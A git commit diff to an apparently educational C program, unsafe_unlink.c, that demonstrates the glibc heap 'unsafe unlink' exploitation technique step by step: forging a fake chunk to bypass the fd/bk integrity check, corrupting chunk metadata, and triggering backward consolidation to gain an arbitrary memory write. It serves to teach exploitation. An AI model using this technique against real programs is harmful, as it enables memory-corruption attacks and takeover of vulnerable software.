65cf0357b6240e9bf9de8d2314892f625085416f
antoniob <antoniob@cs.ucsb.edu>
2016-01-27 04:36:50 -0800

    finishing unsafe_unlink

--- unsafe_unlink.c
+++ unsafe_unlink.c
@@ -1,44 +1,67 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
 
-unsigned long long* pointer_vector[10];
+
+uint64_t* pointer_vector[10];
+
+
+void print_pointer_vectors(){
+	int i;
+	for(i=0;i<2;i++){
+		printf("pointer_vector[%d]: %p --> %p\n",i,&(pointer_vector[i]),pointer_vector[i]);
+	}
+}
+
 
 int main()
 {
 	printf("Welcome to unsafe unlink 2.0!\n");
+	printf("This technique can be used when you have contiguous malloc'ed regions pointed by an array of pointers in a known location\n");
 
 	int malloc_size = 0x80; //we want to be big enough not to use fastbins
-	int header_size = 2*8;
+	int header_size = 2;
 
 	printf("We create an array of pointers to malloc'ed regions.\n");
-	printf("The point of this exercise is to use malloc to corrupt one of these pointers.\n");
+	printf("The point of this exercise is to use malloc to corrupt one of these pointers to achieve arbitrary memory write.\n\n");
 
-	pointer_vector[0] = (unsigned long long*) malloc(malloc_size);
-	pointer_vector[1] = (unsigned long long*) malloc(malloc_size);
-	pointer_vector[2] = (unsigned long long*) malloc(malloc_size);
-	unsigned long long* chunk2_ptr = pointer_vector[2] - 2;
-
+	pointer_vector[0] = (uint64_t*) malloc(malloc_size); //chunk0
+	pointer_vector[1] = (uint64_t*) malloc(malloc_size); //chunk1
 	printf("The pointer vector starts at: %p\n",&(pointer_vector[0]));
-	printf("Allocated regions: %p %p %p\n",pointer_vector[0],pointer_vector[1],pointer_vector[2]);
+	print_pointer_vectors();
 	
-	printf("We create a fake chunk inside in the second allocated region.\n");
-	printf("The next free chunk of our fake chunk will be our pointer vector.\n");
-	pointer_vector[1][2] = (unsigned long long) &(pointer_vector[1])-(8*3);
-	printf("The previous free chunk of our fake chunk will be our pointer vector.\n");
-	printf("We do this to pass this check: (P->fd->bk != P || P->bk->fd != P)\n");
-	pointer_vector[1][3] = (unsigned long long) &(pointer_vector[1])-(8*2);
+	printf("We create a fake chunk inside in the first allocated region.\n");
+	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to pointer_vector[0] so that P->fd->bk = P.\n");
+	pointer_vector[0][2] = (uint64_t) &(pointer_vector[0])-(sizeof(uint64_t)*3);
+	printf("We setup the 'next_free_chunk' (bk) of our fake chunk to point near to pointer_vector[0] so that P->bk->fd = P.\n");
+	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) != False\n");
+	pointer_vector[0][3] = (uint64_t) &(pointer_vector[0])-(sizeof(uint64_t)*2);
+	printf("Fake chunk fd: %p\n",(void*) pointer_vector[0][2]);
+	printf("Fake chunk  bk: %p\n",(void*) pointer_vector[0][3]);
 
-	printf("We shrink the size of chunk1 (saved as 'previous size' in chunk2) so that free will think that chunk1 starts where we placed our fake chunk.\n");
-	chunk2_ptr[0] = malloc_size;
-	printf("We mark our fake chunk as free by setting 'previous in use' of chunk2 as False\n");
-	chunk2_ptr[1] &= ~1;
+	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
+	uint64_t* chunk1_ptr = pointer_vector[1] - header_size;
+	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
+	chunk1_ptr[0] = malloc_size;
+	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_ptr[0]);
+	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n");
+	chunk1_ptr[1] &= ~1;
 	
-	printf("Now we free chunk2 so that consolidate backward will unlink our fake chunk, overwriting pointer_vector[1]\n");
-	free(pointer_vector[2]);
+	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting pointer_vector[0].\n");
+	free(pointer_vector[1]);
+	print_pointer_vectors();
 
-	printf("Allocated regions: %p %p %p\n",pointer_vector[0],pointer_vector[1],pointer_vector[2]);
+	printf("At this point we can use pointer_vector[0] to overwrite itself (or any other pointer in pointer_vector) to an arbitrary location.\n");
+	char victim_string[8];
+	strcpy(victim_string,"Hello!~");
+	pointer_vector[0][3] = (uint64_t) victim_string;
+	print_pointer_vectors();
 
-	printf("At this point you can write data at pointer_vector[1] to change pointer_vector[0] to any address you want to write to.\n");
+	printf("pointer_vector[0] is now pointing where we want, we use it to overwrite our victim string.\n");
+	printf("Original value: %s\n",victim_string);
+	pointer_vector[0][0] = 0x4141414142424242LL;
+	printf("New Value: %s\n",victim_string);
 }
 
 
